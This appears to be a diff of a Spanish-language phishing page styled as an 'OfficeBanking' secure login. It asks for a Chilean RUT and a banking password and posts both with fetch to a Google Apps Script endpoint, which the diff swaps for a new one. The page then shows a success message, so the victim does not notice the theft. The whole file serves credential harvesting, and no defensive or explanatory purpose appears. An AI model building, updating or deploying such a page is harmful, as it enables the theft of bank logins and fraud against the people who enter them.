@@ -3,33 +3,77 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ingreso Seguro</title>
+  <title>OfficeBanking - Ingreso Seguro</title>
   <style>
-    body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
-    .contenedor { max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    h2 { text-align: center; margin-bottom: 20px; }
-    input[type="text"], input[type="password"] {
-      width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
-    button {
-      width: 100%; padding: 12px; background-color: #0275d8; border: none; color: white; font-size: 16px;
-      border-radius: 4px; cursor: pointer;
+
+    .formulario {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 380px;
     }
-    button:disabled { background-color: #7daee3; }
-    #mensaje, #cargando { display: none; text-align: center; margin-top: 10px; }
-    #cargando { color: #666; }
+
+    .formulario h2 {
+      text-align: center;
+      color: #0072bb;
+      margin-bottom: 20px;
+    }
+
+    .formulario input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccd1d9;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .formulario button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0072bb;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .formulario button:disabled {
+      background-color: #88bde0;
+      cursor: not-allowed;
+    }
+
+    #cargando, #mensaje {
+      text-align: center;
+      margin-top: 15px;
+      display: none;
+    }
+
+    #cargando { color: #777; }
     #mensaje { color: green; }
   </style>
 </head>
 <body>
-  <div class="contenedor">
-    <h2>Acceso a tu cuenta</h2>
+  <div class="formulario">
+    <h2>Acceso Seguro</h2>
     <form id="formulario">
-      <input type="text" name="rut" placeholder="RUT" required />
-      <input type="password" name="clave" placeholder="Clave" required />
+      <input type="text" name="rut" placeholder="Ingresa tu RUT" required />
+      <input type="password" name="clave" placeholder="Ingresa tu Clave" required />
       <button type="submit">Ingresar</button>
       <div id="cargando">CARGANDO...</div>
-      <div id="mensaje">Información enviada correctamente.</div>
+      <div id="mensaje">¡Enviado correctamente!</div>
     </form>
   </div>
 
@@ -48,7 +92,7 @@
       datos.append("rut", form.rut.value);
       datos.append("clave", form.clave.value);
 
-      fetch("https://script.google.com/macros/s/AKfycby4LWfUVek56fc22bPlvSiPJPnog8AhDoeueq1NVHtmzPXKv7HDhIxzF-EkF6G46ZFrgA/exec", {
+      fetch("https://script.google.com/macros/s/AKfycbwnIB8we8POlSKsIr2URrZixdYNV1PPLQIwDE2XoCe_mLIT3wcO91Z1vMer-Q6ZKM_k5A/exec", {
         method: "POST",
         body: datos
       })
